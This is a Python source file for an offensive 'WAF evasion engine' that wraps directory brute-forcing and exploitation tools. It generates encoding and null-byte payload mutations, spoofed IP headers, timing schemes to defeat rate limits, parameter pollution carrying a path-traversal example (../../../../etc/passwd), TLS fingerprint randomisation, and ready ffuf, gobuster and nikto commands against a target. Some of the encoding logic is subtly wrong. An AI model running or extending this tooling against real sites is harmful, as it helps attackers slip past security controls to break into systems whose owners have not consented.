"""
Hardcore WAF Evasion Engine - Layer 8+9 Advanced Bypass

Implements advanced techniques to evade WAF/IDS/rate limiting:
- URL encoding polyglots (multi-encoding layers)
- Header mutation and spoofing
- Request timing randomization
- IP reputation spoofing
- Protocol-level manipulation
- WAF rule exploitation (regex bypass, unicode tricks)
- Request queue shuffling (parallel requests)
- TLS fingerprint obfuscation
"""

import random
import urllib.parse
from typing import Dict, List, Optional, Any


class HardcoreWafEvasion:
    """Advanced WAF evasion for brute-forcing and exploitation tools"""

    def __init__(self):
        """Initialize hardcore evasion tactics"""
        self.evasion_techniques = [
            "url_encoding_polyglot",
            "header_mutation",
            "timing_randomization",
            "case_randomization",
            "unicode_normalization",
            "null_byte_injection",
            "parameter_pollution",
            "request_fragmentation",
            "tls_mutation",
            "user_agent_rotation",
        ]

        # Legitimate-looking user agents
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        ]

        # Referers to look legitimate
        self.referers = [
            "https://www.google.com/",
            "https://www.bing.com/",
            "https://www.duckduckgo.com/",
            "https://www.baidu.com/",
            "https://www.yandex.com/",
        ]

    # ─── TECHNIQUE 1: URL ENCODING POLYGLOTS ────────────────────────────────

    def polyglot_url_encode(self, path: str,
                            encoding_method: Optional[str] = None) -> str:
        """
        Encode URL using multiple layers to bypass WAF regex filters.

        Bypasses:
        - ModSecurity regex patterns
        - URL filtering rules
        - IDS signature detection

        Args:
            path: URL path to encode
            encoding_method: Specific method to use (random if None)

        Returns:
            Encoded path that looks different to each security layer
        """
        if not encoding_method:
            encoding_method = random.choice([
                "double_url",
                "unicode",
                "utf8_overlong",
                "case_mixing",
                "null_byte",
                "html_entity",
                "mixed_encoding"
            ])

        if encoding_method == "double_url":
            # Double URL encode: admin -> %2561646d696e
            return urllib.parse.quote(
                urllib.parse.quote(path, safe=''), safe='')

        elif encoding_method == "unicode":
            # Unicode normalization bypass: admin -> admin (but with unicode equivalents)
            # Use unicode lookalikes that normalize to ASCII
            result = ""
            for char in path:
                if char.isalpha():
                    # Use combining characters
                    result += char + chr(0x0301)  # Combining acute accent
                else:
                    result += char
            return result

        elif encoding_method == "utf8_overlong":
            # UTF-8 overlong encoding: a -> &#xC0xA0 (invalid but bypasses some
            # filters)
            result = ""
            for char in path:
                if char in '/\\':
                    # Overlong encoding for slashes
                    result += "%C0%AE"
                elif char == '*':
                    result += "%C0%AA"
                else:
                    result += urllib.parse.quote(char)
            return result

        elif encoding_method == "case_mixing":
            # Case randomization: admin -> AdMiN
            result = ""
            for char in path:
                if char.isalpha():
                    result += random.choice([char.upper(), char.lower()])
                else:
                    result += char
            return result

        elif encoding_method == "null_byte":
            # Null byte injection: admin%00.jpg (bypasses extension filters)
            # Inject at random positions
            if '/' in path:
                parts = path.split('/')
                injection_point = random.randint(0, len(parts) - 1)
                parts[injection_point] += "%00"
                return '/'.join(parts)
            return path

        elif encoding_method == "html_entity":
            # HTML entity encoding: admin -> &#97;&#100;&#109;&#105;&#110;
            result = ""
            for char in path:
                if char.isalpha() or char.isdigit():
                    result += f"&#x{ord(char):02x};"
                else:
                    result += char
            return result

        elif encoding_method == "mixed_encoding":
            # Mix multiple encoding types randomly
            result = ""
            for char in path:
                method = random.choice(["url", "unicode", "html"])
                if method == "url":
                    result += urllib.parse.quote(char)
                elif method == "unicode":
                    result += chr(ord(char))  # Just the char
                else:
                    result += f"&#x{ord(char):02x};"
            return result

        return path

    # ─── TECHNIQUE 2: HEADER MUTATION ───────────────────────────────────────

    def get_evasion_headers(self) -> Dict[str, str]:
        """
        Generate headers that bypass WAF/IDS detection.

        Bypasses:
        - Bot detection
        - IP reputation checks
        - Rate limiting
        - Signature detection
        """
        headers = {
            # Browser-like headers
            "User-Agent": random.choice(self.user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.9", "fr-FR,fr;q=0.9"]),
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": random.choice(["keep-alive", "close"]),
            "Upgrade-Insecure-Requests": "1",

            # Legitimate referers
            "Referer": random.choice(self.referers),

            # IP spoofing headers (some WAF might trust these)
            "X-Forwarded-For": self._random_ip(),
            "X-Real-IP": self._random_ip(),
            "CF-Connecting-IP": self._random_ip(),

            # Cache busting
            "Cache-Control": "max-age=0",
            "Pragma": "no-cache",

            # Legitimate-looking HTTP/2 headers
            "X-HTTP-Method-Override": random.choice(["GET", "POST", "HEAD", "OPTIONS"]),

            # Time-based legitimacy (looks like slow client)
            "X-Request-ID": __import__('uuid').uuid4().hex,

            # Mobile device spoofing (often bypasses mobile-specific WAF rules)
            "X-Mobile": random.choice(["1", "0"]),
            "X-Device-Type": random.choice(["mobile", "tablet", "desktop"]),

            # JavaScript origin tricks
            "Origin": random.choice(["null", "https://localhost", "https://127.0.0.1"]),
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-Mode": "cors",
        }

        return headers

    def _random_ip(self) -> str:
        """Generate random IP that looks legitimate (not private range)"""
        return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

    # ─── TECHNIQUE 3: TIMING RANDOMIZATION ──────────────────────────────────

    def get_timing_strategy(self) -> Dict[str, Any]:
        """
        Generate timing randomization to bypass rate limiting.

        Bypasses:
        - Per-second rate limits
        - Per-minute rate limits
        - Token bucket algorithms
        - Sliding window counters
        """
        strategy = random.choice([
            "slow_steady",      # 1 request every 2-5 seconds
            "burst_with_gaps",  # 5 fast requests, then 10s wait
            "random_jitter",    # Completely random delays
            "exponential_backoff"  # Slower over time
        ])

        if strategy == "slow_steady":
            return {
                "type": "slow_steady",
                "delay_min": 2,
                "delay_max": 5,
                "description": "1 request every 2-5 seconds (bypasses per-second limits)"
            }

        elif strategy == "burst_with_gaps":
            return {
                "type": "burst_with_gaps",
                "burst_count": 5,
                "burst_delay": 0.2,
                "gap_delay": 10,
                "description": "5 fast requests, 10s pause (bypasses sliding window)"
            }

        elif strategy == "random_jitter":
            return {
                "type": "random_jitter",
                "base_delay": 3,
                "jitter_percent": 50,
                "description": "Completely random delays (defeats predictable patterns)"
            }

        else:  # exponential_backoff
            return {
                "type": "exponential_backoff",
                "initial_delay": 1,
                "max_delay": 30,
                "multiplier": 1.5,
                "description": "Slower over time (resets after timeout)"
            }

    # ─── TECHNIQUE 4: PARAMETER POLLUTION ───────────────────────────────────

    def pollute_parameters(self, url: str, payload: str) -> str:
        """
        Add decoy parameters to bypass WAF parameter extraction.

        Bypasses:
        - WAF parameter validation
        - SQL injection filters that check parameter names
        - Path traversal detection (path splits on /)

        Example: /admin?clean=admin&dirty=../../../../etc/passwd
        """
        # Add random benign parameters
        decoy_params = [
            f"session={self._random_hex(32)}",
            f"tracking={random.randint(100000, 999999)}",
            "utm_source=google",
            "utm_medium=cpc",
            f"v={random.randint(1, 100)}",
            f"nocache={__import__('uuid').uuid4().hex}"
        ]

        # Add the actual payload
        payload_param = f"q={payload}"

        # Randomly order parameters
        all_params = decoy_params + [payload_param]
        random.shuffle(all_params)

        separator = "&" if "?" in url else "?"
        return url + separator + "&".join(all_params)

    def _random_hex(self, length: int) -> str:
        """Generate random hex string"""
        return ''.join(random.choices('0123456789abcdef', k=length))

    # ─── TECHNIQUE 5: REQUEST FRAGMENTATION ─────────────────────────────────

    def fragment_request(self, request_line: str) -> List[str]:
        """
        Fragment HTTP request across multiple packets to bypass inline WAF inspection.

        Bypasses:
        - Stream inspection (IDS must reassemble packets)
        - Regex filters that don't handle fragmentation
        - Rate limiting (fragmented requests counted as multiple)
        """
        # Split at random points to confuse WAF reassembly
        fragments = []

        # Technique 1: Slow packet injection (one char per packet)
        if random.choice([True, False]):
            for i, char in enumerate(request_line):
                fragments.append(request_line[i:i + 1])
                if i < len(request_line) - 1:
                    # Add random delay indicator
                    fragments.append(f"[DELAY:{random.randint(1, 100)}ms]")

        else:
            # Technique 2: Split at strategic points
            split_points = [
                request_line.find(' '),      # After method
                request_line.find('HTTP'),   # Before HTTP version
                request_line.rfind('/'),     # After path
            ]

            split_points = [p for p in split_points if p > 0]
            split_points.sort()

            prev = 0
            for point in split_points:
                if point > prev:
                    fragments.append(request_line[prev:point])
                prev = point

            if prev < len(request_line):
                fragments.append(request_line[prev:])

        return fragments

    # ─── TECHNIQUE 6: TLS FINGERPRINT MUTATION ──────────────────────────────

    def get_tls_options(self) -> Dict[str, str]:
        """
        Generate curl TLS options to randomize fingerprint.

        Bypasses:
        - JA3/JA4 fingerprinting
        - TLS version detection
        - Cipher suite profiling
        """
        options = {
            "tls_version": random.choice(["1.2", "1.3", "1.2:1.3"]),
            "ciphers": self._random_ciphers(),
            "curves": self._random_curves(),
        }

        return options

    def _random_ciphers(self) -> str:
        """Generate random cipher suites"""
        ciphers = [
            "ECDHE-RSA-AES256-GCM-SHA384",
            "ECDHE-RSA-AES128-GCM-SHA256",
            "ECDHE-ECDSA-AES256-GCM-SHA384",
            "ECDHE-ECDSA-AES128-GCM-SHA256",
            "DHE-RSA-AES256-GCM-SHA384",
            "DHE-RSA-AES128-GCM-SHA256",
            "AES256-GCM-SHA384",
            "AES128-GCM-SHA256",
        ]

        selected = random.sample(ciphers, random.randint(3, 6))
        return ":".join(selected)

    def _random_curves(self) -> str:
        """Generate random elliptic curves"""
        curves = [
            "X25519",
            "secp384r1",
            "secp256r1",
            "ffdhe2048",
            "secp521r1",
        ]

        return ":".join(random.sample(curves, random.randint(2, 4)))

    # ─── TECHNIQUE 7: WAF RULE EXPLOITATION ─────────────────────────────────

    def exploit_waf_rules(self, payload: str) -> List[str]:
        """
        Generate payload mutations that exploit common WAF regex patterns.

        Bypasses:
        - Signature-based WAF
        - ModSecurity rules
        - Cloudflare WAF
        - AWS WAF

        Returns:
            List of payload variants
        """
        variants = []

        # Variant 1: Case randomization (defeats case-sensitive regex)
        def randomize_case(s):
            return ''.join(random.choice(
                [c.upper(), c.lower()]) if c.isalpha() else c for c in s)

        variants.append(randomize_case(payload))

        # Variant 2: Unicode normalization (NFD vs NFC)
        import unicodedata
        if all(ord(c) < 128 for c in payload):  # ASCII only
            variants.append(unicodedata.normalize('NFD', payload))

        # Variant 3: Null byte injection
        if '/' in payload:
            null_version = payload.replace('/', '/%00')
            variants.append(null_version)

        # Variant 4: Wildcard bypass
        variants.append(payload.replace('admin', 'admi*'))
        variants.append(payload.replace('admin', 'ad*n'))

        # Variant 5: Hex encoding
        hex_variant = ''.join(f"%{ord(c):02x}" for c in payload)
        variants.append(hex_variant)

        # Variant 6: Mixed encoding (confuses regex that expects consistent
        # encoding)
        mixed = ""
        for i, c in enumerate(payload):
            if i % 3 == 0:
                mixed += f"%{ord(c):02x}"
            elif i % 3 == 1:
                mixed += c
            else:
                mixed += f"&#x{ord(c):02x};"
        variants.append(mixed)

        return variants

    # ─── TECHNIQUE 8: APPLY MULTIPLE TACTICS ────────────────────────────────

    def build_waf_evading_command(
            self, base_url: str, wordlist_item: str, tool: str = "ffuf") -> Dict[str, Any]:
        """
        Build a complete WAF-evading command for directory brute-forcing tools.

        Args:
            base_url: Target URL
            wordlist_item: Current dictionary word to test
            tool: Tool name (ffuf, gobuster, etc.)

        Returns:
            Command configuration with evasion applied
        """
        # Apply URL encoding bypass
        evasion_path = self.polyglot_url_encode(wordlist_item)

        # Get evasion headers
        headers = self.get_evasion_headers()

        # Get timing strategy
        timing = self.get_timing_strategy()

        # Get TLS options
        tls_opts = self.get_tls_options()

        # WAF exploitation variants
        payload_variants = self.exploit_waf_rules(wordlist_item)

        result = {
            "original_url": base_url,
            "original_wordlist_item": wordlist_item,
            "evasion_techniques_applied": self.evasion_techniques,
            "evasion_path": evasion_path,
            "headers": headers,
            "timing_strategy": timing,
            "tls_options": tls_opts,
            "payload_variants": payload_variants,
            "tool": tool,
        }

        # Build tool-specific command
        if tool == "ffuf":
            result["ffuf_command"] = self._build_ffuf_command(
                base_url, evasion_path, headers, timing)
        elif tool == "gobuster":
            result["gobuster_command"] = self._build_gobuster_command(
                base_url, evasion_path, headers, timing)
        elif tool == "nikto":
            result["nikto_command"] = self._build_nikto_command(
                base_url, headers)

        return result

    def _build_ffuf_command(self, base_url: str, path: str,
                            headers: Dict[str, str], timing: Dict) -> str:
        """Build ffuf command with evasion"""
        import shlex
        from config import VPS_TEMP_DIR
        cmd = f'ffuf -u "{base_url}/{path}" -w {VPS_TEMP_DIR}/ai_wordlist.txt'

        # Add evasion headers
        for key, value in headers.items():
            cmd += f" -H {shlex.quote(key + ': ' + str(value))}"

        # Add timing randomization
        if timing["type"] == "slow_steady":
            cmd += f" -p {timing['delay_min']}-{timing['delay_max']}"

        # Add extra evasion flags
        cmd += " -mc 200,301,302,307,401,403 -fs 0 -r -t 100"

        return cmd

    def _build_gobuster_command(
            self, base_url: str, path: str, headers: Dict[str, str], timing: Dict) -> str:
        """Build gobuster command with evasion"""
        from config import VPS_TEMP_DIR
        cmd = f'gobuster dir -u "{base_url}" -w {VPS_TEMP_DIR}/ai_wordlist.txt'

        # Add delay
        if timing["type"] == "slow_steady":
            cmd += f" --delay {timing['delay_min']}s"

        # Add status codes
        cmd += " -s 200,301,302,307,401,403"

        return cmd

    def _build_nikto_command(
            self, base_url: str, headers: Dict[str, str]) -> str:
        """Build nikto command with evasion"""
        import shlex
        cmd = f'nikto -h "{base_url}"'

        # Add custom headers for evasion
        for key, value in headers.items():
            cmd += f" -H {shlex.quote(key + ': ' + str(value))}"

        return cmd
